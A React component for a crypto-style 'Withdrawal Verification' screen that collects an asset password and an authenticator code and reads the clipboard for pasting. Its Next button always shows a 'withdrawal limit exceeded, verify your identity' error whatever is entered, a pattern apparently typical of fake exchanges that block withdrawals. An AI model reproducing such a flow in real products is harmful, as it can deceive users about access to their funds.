import React, {useState} from 'react';
import style from "../styles/withdraw.module.scss";
import {NavLink} from "react-router-dom";

const Withdraw = () => {
    const [password, setPassword] = useState('')
    const [auth, setAuth] = useState('')
    const [hidden, setHidden] = useState(false);
    const [error, setError] = useState(false);
    const [isTextInClipboard, setIsTextInClipboard] = useState(false);
    const toggleHidden = () => {
        setHidden(!hidden)
    }

    const toggleError = () => {
        setError(true)
    }

    const checkClipboard = async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text) {
                setIsTextInClipboard(true);
            } else {
                setIsTextInClipboard(false);
            }
        } catch (err) {
            console.error("Failed to read clipboard contents: ", err);
        }
    };

    const pasteFromClipboard = async () => {
        try {
            const text = await navigator.clipboard.readText();
            setAuth(text);
        } catch (err) {
            console.error("Failed to read clipboard contents: ", err);
        }
    };
    return (
        <div className={style.container}>
            <div className={style.cross}>
                <NavLink to="/wallet">
                    <svg width="13" height="13" viewBox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path fillRule="evenodd" clipRule="evenodd"
                              d="M11.9238 2.10722C11.9915 2.0396 12.0452 1.95931 12.0819 1.87093C12.1186 1.78255 12.1375 1.68782 12.1375 1.59213C12.1376 1.49645 12.1188 1.40169 12.0823 1.31326C12.0457 1.22484 11.9921 1.14448 11.9245 1.07678C11.8568 1.00908 11.7765 0.955364 11.6882 0.918692C11.5998 0.882021 11.5051 0.863117 11.4094 0.863058C11.3137 0.862999 11.2189 0.881787 11.1305 0.91835C11.0421 0.954912 10.9617 1.00853 10.894 1.07615L6.49996 5.47022L2.10716 1.07615C1.97043 0.939423 1.78499 0.86261 1.59162 0.86261C1.39826 0.86261 1.21282 0.939423 1.07609 1.07615C0.939362 1.21288 0.862549 1.39832 0.862549 1.59168C0.862549 1.78505 0.939362 1.97049 1.07609 2.10722L5.47016 6.50002L1.07609 10.8928C1.00839 10.9605 0.954686 11.0409 0.918046 11.1293C0.881407 11.2178 0.862549 11.3126 0.862549 11.4083C0.862549 11.5041 0.881407 11.5989 0.918046 11.6874C0.954686 11.7758 1.00839 11.8562 1.07609 11.9239C1.21282 12.0606 1.39826 12.1374 1.59162 12.1374C1.68737 12.1374 1.78217 12.1186 1.87063 12.0819C1.95908 12.0453 2.03946 11.9916 2.10716 11.9239L6.49996 7.52982L10.894 11.9239C11.0308 12.0604 11.2161 12.1371 11.4094 12.137C11.6026 12.1369 11.7879 12.06 11.9245 11.9233C12.061 11.7865 12.1377 11.6011 12.1375 11.4079C12.1374 11.2147 12.0606 11.0294 11.9238 10.8928L7.52976 6.50002L11.9238 2.10722Z"
                              fill="#656565"/>
                    </svg>
                </NavLink>
            </div>
            <div className={style.title__withdraw__container}>
                <p className={style.title__withdraw}>Withdrawal Verification 1/2</p>
            </div>
            <div className={style.inp__withdraw__container} style={{marginTop: " 50px"}}>
                <p className={style.inp__label}>Asset Password</p>
                <div className={style.inp__wrapper}>
                    <input
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className={style.inp__withdraw}
                        type={hidden ? "text" : "password"}
                    />
                    <div onClick={toggleHidden} className={style.icon__container}>
                        {!hidden ? (
                            <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none"
                                 viewBox="0 0 24 24">
                                <path fill="#626262" d="M12 14a2 2 0 100-4 2 2 0 000 4z"></path>
                                <path fill="#626262"
                                      d="M12 4C5 4 1 12 1 12s4 8 11 8 11-8 11-8-4-8-11-8zm0 12c-2.2 0-4-1.8-4-4s1.8-4 4-4 4 1.8 4 4-1.8 4-4 4z"></path>
                            </svg>
                        ) : (
                            <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none"
                                 viewBox="0 0 24 24">
                                <path fill="#626262"
                                      d="M18.6 17.4C21.4 15.1 23 12 23 12s-4-8-11-8c-2 0-3.8.7-5.3 1.6L4.6 3.4c-.3-.3-.8-.3-1.1 0-.3.3-.3.8 0 1.1l2 2C2.6 8.9 1 12 1 12s4 8 11 8c2 0 3.8-.7 5.3-1.6l2.2 2.2c.2.2.4.2.6.2.2 0 .4-.1.6-.2.3-.3.3-.8 0-1.1l-2.1-2.1zM12 8c2.2 0 4 1.8 4 4 0 .8-.2 1.6-.7 2.2l-1.5-1.5c.1-.2.1-.5.1-.7 0-1.1-.9-2-2-2-.3 0-.5.1-.7.1L9.8 8.7c.6-.5 1.4-.7 2.2-.7zm0 8c-2.2 0-4-1.8-4-4 0-.8.2-1.6.7-2.2l1.5 1.5c-.1.2-.2.4-.2.7 0 1.1.9 2 2 2 .3 0 .5-.1.7-.1l1.5 1.5c-.6.4-1.4.6-2.2.6z"></path>
                            </svg>
                        )}
                    </div>
                </div>
            </div>
            <div className={style.inp__withdraw__container}>
                <p className={style.inp__label}>Google Authentication</p>
                <input onClick={checkClipboard} value={auth} onChange={(e) => setAuth(e.target.value)}
                       className={`${style.inp__withdraw} ${style.inp__withdraw__auth}`}
                       type="text"/>
                {isTextInClipboard &&
                    <div onClick={pasteFromClipboard} className={style.paste__container}>
                        <p className={style.paste}>Paste</p>
                    </div>
                }
                {error &&
                    <div className={style.error__container}>
                        <p className={style.error__text}>
                            Withdrawal limit exceeded. Please, verify
                            your identity and try again
                        </p>
                    </div>
                }
            </div>
            <button disabled={!password && !auth} onClick={toggleError} className={style.btn}>
                Next
            </button>
        </div>
    );
};

export default Withdraw;
